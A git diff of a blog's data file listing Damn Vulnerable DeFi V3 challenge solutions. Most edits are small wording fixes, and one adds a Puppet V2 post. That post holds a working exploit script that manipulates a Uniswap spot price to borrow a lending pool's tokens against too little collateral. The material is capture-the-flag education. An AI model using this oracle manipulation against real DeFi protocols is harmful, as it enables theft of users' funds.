@@ -3,7 +3,7 @@ export default {
         {
             id: "damn-vulnerable-defi-solutions-1-unstoppable",
             title: `Damn Vulnerable DeFi V3 Solutions: Unstoppable`,
-            description: `My solution to 1st Damn Vulnerable DeFi v3 challenge.`,
+            description: `My solution to the 1st Damn Vulnerable DeFi v3 challenge.`,
             date: "May 30, 2023",
             snippets: [
                 `if (convertToShares(totalSupply) != balanceBefore) revert InvalidBalance();`,
@@ -15,7 +15,7 @@ export default {
         {
             id: "damn-vulnerable-defi-solutions-2-naive-receiver",
             title: `Damn Vulnerable DeFi V3 Solutions: Naive Receiver`,
-            description: `My solution to 2nd Damn Vulnerable DeFi v3 challenge.`,
+            description: `My solution to the 2nd Damn Vulnerable DeFi v3 challenge.`,
             date: "June 1, 2023",
             snippets: [
                 `// SPDX-License-Identifier: MIT
@@ -56,7 +56,7 @@ contract Exploit_NaiveReceiver {
         {
             id: "damn-vulnerable-defi-solutions-3-truster",
             title: `Damn Vulnerable DeFi V3 Solutions: Truster`,
-            description: `My solution to 3rd Damn Vulnerable DeFi v3 challenge.`,
+            description: `My solution to the 3rd Damn Vulnerable DeFi v3 challenge.`,
             date: "June 2, 2023",
             snippets: [
                 `// SPDX-License-Identifier: MIT
@@ -102,7 +102,7 @@ contract Exploit_Truster {
         {
             id: "damn-vulnerable-defi-solutions-4-side-entrance",
             title: `Damn Vulnerable DeFi V3 Solutions: Side Entrance`,
-            description: `My solution to 4th Damn Vulnerable DeFi v3 challenge.`,
+            description: `My solution to the 4th Damn Vulnerable DeFi v3 challenge.`,
             date: "June 3, 2023",
             snippets: [
                 `// SPDX-License-Identifier: MIT
@@ -153,7 +153,7 @@ contract Exploit_SideEntrance {
         {
             id: "damn-vulnerable-defi-solutions-5-the-rewarder",
             title: `Damn Vulnerable DeFi V3 Solutions: The Rewarder`,
-            description: `My solution to 5th Damn Vulnerable DeFi V3 challenge.`,
+            description: `My solution to the 5th Damn Vulnerable DeFi V3 challenge.`,
             date: "June 5, 2023",
             snippets: [
                 `// SPDX-License-Identifier: MIT
@@ -230,7 +230,7 @@ contract Exploit_TheRewarder {
         {
             id: "damn-vulnerable-defi-solutions-6-selfie",
             title: `Damn Vulnerable DeFi V3 Solutions: Selfie`,
-            description: `My solution to 6th Damn Vulnerable DeFi V3 challenge.`,
+            description: `My solution to the 6th Damn Vulnerable DeFi V3 challenge.`,
             date: "June 6, 2023",
             snippets: [
                 `// SPDX-License-Identifier: MIT
@@ -297,7 +297,7 @@ contract Exploit_Selfie is IERC3156FlashBorrower {
         {
             id: "damn-vulnerable-defi-solutions-7-compromised",
             title: `Damn Vulnerable DeFi V3 Solutions: Compromised`,
-            description: `My solution to 7th Damn Vulnerable DeFi V3 challenge.`,
+            description: `My solution to the 7th Damn Vulnerable DeFi V3 challenge.`,
             date: "June 7, 2023",
             snippets: [
                 `//HTTP/2 200 OK
@@ -334,7 +334,7 @@ contract Exploit_Selfie is IERC3156FlashBorrower {
         {
             id: "damn-vulnerable-defi-solutions-8-puppet",
             title: `Damn Vulnerable DeFi V3 Solutions: Puppet`,
-            description: `My solution to 8th Damn Vulnerable DeFi V3 challenge.`,
+            description: `My solution to the 8th Damn Vulnerable DeFi V3 challenge.`,
             date: "June 8, 2023",
             snippets: [
                 `// SPDX-License-Identifier: MIT
@@ -403,6 +403,42 @@ contract Exploit_Puppet {
         s,
         { value: ethers.utils.parseEther("20") }
     );
+});`,
+            ],
+        },
+
+        {
+            id: "damn-vulnerable-defi-solutions-9-puppet-v2",
+            title: `Damn Vulnerable DeFi V3 Solutions: Puppet V2`,
+            description: `My solution to the 9th Damn Vulnerable DeFi V3 challenge.`,
+            date: "June 9, 2023",
+            snippets: [
+                `it("Exploit", async function () {
+    await token
+        .connect(player)
+        .approve(uniswapRouter.address, PLAYER_INITIAL_TOKEN_BALANCE);
+    // Swap all our DVT tokens for ETH. This action will dump the spot price.
+    await uniswapRouter
+        .connect(player)
+        .swapExactTokensForETH(
+            PLAYER_INITIAL_TOKEN_BALANCE,
+            1,
+            [token.address, weth.address],
+            player.address,
+            Date.now()
+        );
+    // exchange ETH for WETH using deposit function in weth contract
+    // we must hold WETH because lender contract only accepts WETH as colletral
+    await weth.connect(player).deposit({
+        value: ethers.utils.parseEther("29.5"),
+    });
+    // approve the lender contract so it can pull WETH tokens from attacker's address
+    await weth
+        .connect(player)
+        .approve(lendingPool.address, ethers.utils.parseEther("29.5"));
+    // finally borrow 1 million DVT tokens supplying extremely low colletral compared
+    // to the amount of colletral needed before we manipulated the liquidity pool
+    await lendingPool.connect(player).borrow(POOL_INITIAL_TOKEN_BALANCE);
 });`,
             ],
         },
